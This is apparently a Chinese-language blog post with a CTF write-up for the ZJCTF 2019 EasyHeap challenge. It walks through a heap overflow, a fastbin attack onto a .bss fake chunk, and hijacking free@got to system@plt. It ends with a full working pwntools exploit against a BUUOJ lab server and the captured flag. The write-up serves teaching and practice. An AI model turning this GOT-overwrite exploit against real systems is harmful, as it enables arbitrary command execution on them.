+++
title = "codex通解"
date = "2026-04-17"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
```markdown
# [ZJCTF 2019] EasyHeap WP

## 题目分析

程序提供 3 个基本堆操作：

- `create`
- `edit`
- `delete`

保护如下：

- Partial RELRO
- Canary
- NX
- No PIE

因为没有 PIE，所以程序内的全局变量、GOT 地址都是固定的；又因为是 Partial RELRO，所以 GOT 可写，适合做 GOT 劫持。

---

## 程序关键点

程序里有一个全局数组 `heaparray`，地址为：

```text
heaparray = 0x6020e0
```
它本质上就是一个保存堆块指针的数组，可以理解为：
```c
char *heaparray[10];
```
申请堆块时：
```c
heaparray[i] = malloc(size);
```
编辑堆块时：
```c
read(0, heaparray[i], size);
```
删除堆块时：
```c
free(heaparray[i]);
heaparray[i] = 0;
```
所以如果我们能改掉 `heaparray[i]` 的值，就等于控制了菜单功能实际操作的地址。

---
## 漏洞点
漏洞在 `edit_heap`：
```c
printf("Size of Heap : ");
read(0, buf, 8);
size = atoi(buf);

printf("Content of heap : ");
read_input(heaparray[idx], size);
```
这里的问题是：
- `size` 由用户自己输入
- 程序不会检查这个 `size` 是否超过原 chunk 实际大小
所以存在 **heap overflow**，可以从当前 chunk 溢出覆盖下一个 chunk 的元数据。

---
## 为什么不走后门
程序里有隐藏菜单 `4869`，会检查全局变量 `magic`，如果满足条件就进入 `l33t()`。
但远程实际测试发现，`l33t()` 执行的是：
```c
system("cat /home/pwn/flag");
```
而这台远程机器的 flag 实际在 `/flag`，所以即使打通后门，也拿不到真正的 flag。
因此更稳妥的做法是直接构造 **任意命令执行**。

---
## 利用思路
整体思路：
1. 利用 `edit` 的堆溢出改掉 fastbin 链表
2. 构造 fake chunk 到 `.bss`
3. 覆盖 `heaparray[0]`
4. 让 `heaparray[0] = free@got`
5. 再通过 `edit(0, ...)` 把 `free@got` 改成 `system@plt`
6. 把某个 chunk 的内容改成 `cat /flag\x00`
7. 调用 `delete(idx)`，实际就会变成 `system("cat /flag")`

---
## 关键地址

```python
heaparray = 0x6020e0
fake_chunk = 0x6020ad
free_got = elf.got['free']
system_plt = elf.plt['system']
```

---
## 利用过程
### 1. 申请 3 个 fastbin chunk
申请 3 个 `0x60` 大小的 chunk：
```python
add(0x60, b'happy')    # 0
add(0x60, b'pad')      # 1
add(0x60, b'happy')    # 2
```

这里 `0x60` 对应的实际 chunk size 是 `0x70`，属于 fastbin。

---
### 2. 释放 chunk2
```python
delete(2)
```
这样 `chunk2` 进入 fastbin。

---
### 3. 溢出 chunk1，篡改 chunk2 的 fd
利用 `edit(1, ...)` 溢出到已经 free 的 `chunk2`：
```python
payload = b'A' * 0x60 + p64(0) + p64(0x71) + p64(0x6020ad)
edit(1, len(payload), payload)
```
这里含义是：
- `b'A' * 0x60` 填满 chunk1
- `p64(0)` 覆盖下一个 chunk 的 `prev_size`
- `p64(0x71)` 保持下一个 chunk 的 size 为合法 fastbin 大小
- `p64(0x6020ad)` 把 `chunk2->fd` 改成 fake chunk
此时 fastbin 链表变成：
```text
chunk2 -> 0x6020ad
```
---
### 4. 连续 malloc 两次，拿到 fake chunk

```python
add(0x60, b'happy')                             # 2
add(0x60, b'A' * 0x23 + p64(elf.got['free']))   # 3
```
第一次 `malloc` 取回真正的 `chunk2`。  
第二次 `malloc` 返回 fake chunk 对应的用户区。

---
## 为什么是 `0x6020ad`
`malloc` 返回的是：
```text
chunk + 0x10
```
所以 fake chunk 的用户区起点是：
```text
0x6020ad + 0x10 = 0x6020bd
```
而：
```text
heaparray = 0x6020e0
```
两者差值：
```text
0x6020e0 - 0x6020bd = 0x23
```
所以：
```python
b'A' * 0x23 + p64(elf.got['free'])
```
的含义就是：
- 前 `0x23` 字节填充
- 后面的 `p64(free@got)` 正好写到 `heaparray[0]`
也就是说，这一步执行完后：
```python
heaparray[0] = free@got
```
---
## 5. 劫持 free@got
既然 `heaparray[0]` 已经被改成了 `free@got`，那么：
heaparray指向的是我们要修改内容的的地址。
```python
edit(0, 8, p64(elf.plt['system']))
```
表面上是在编辑第 0 个堆块，实际上是在写：
```python
free@got = system@plt
```
于是后面程序中的：
```c
free(ptr)
```
都会变成：
```c
system(ptr)
```
---
## 6. 把 chunk1 改成命令字符串

```python
edit(1, len(b'cat /flag\x00'), b'cat /flag\x00')
```
把 `chunk1` 的内容改成：
```text
cat /flag
```
---
## 7. 触发 system("cat /flag")
```python
delete(1)
```
原本这句是：
```c
free(heaparray[1]);
```
但由于我们已经把 `free@got` 改成了 `system@plt`，所以现在实际执行的是：
```c
system(heaparray[1]);
```
也就是：
```sh
system("cat /flag")
```
从而拿到 flag。

---
## EXP
```python
from pwn import *

context.binary = elf = ELF('./easyheap')
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'
io = remote('node5.buuoj.cn', 27663)

def add(size, content):
    io.sendlineafter(b'Your choice :', b'1')
    io.sendlineafter(b'Size of Heap : ', str(size).encode())
    io.sendafter(b'Content of heap:', content)

def edit(index, size, content):
    io.sendlineafter(b'Your choice :', b'2')
    io.sendlineafter(b'Index :', str(index).encode())
    io.sendlineafter(b'Size of Heap : ', str(size).encode())
    io.sendafter(b'Content of heap : ', content)

def delete(index):
    io.sendlineafter(b'Your choice :', b'3')
    io.sendlineafter(b'Index :', str(index).encode())

add(0x60, b'happy')    # 0
add(0x60, b'pad')      # 1
add(0x60, b'happy')    # 2

delete(2)

payload = b'A' * 0x60 + p64(0) + p64(0x71) + p64(0x6020ad)
edit(1, len(payload), payload)

add(0x60, b'happy')                             # 2
add(0x60, b'A' * 0x23 + p64(elf.got['free']))   # 3

edit(0, 8, p64(elf.plt['system']))
edit(1, len(b'cat /flag\x00'), b'cat /flag\x00')

delete(1)

io.interactive()
```

---
## 最终结果
远程返回：
```text
flag{0ad2171d-510e-4e55-b77c-9b01eae59302}
```
---
## 总结

这题核心是两点：
1. `edit` 可控长度导致 heap overflow
2. 利用 fastbin attack 把 fake chunk 打到 `.bss`，进而覆盖 `heaparray`
控制 `heaparray` 后，就能把菜单接口变成任意地址写。  
最终通过把 `free@got` 改成 `system@plt`，实现任意命令执行并读取 `/flag`。
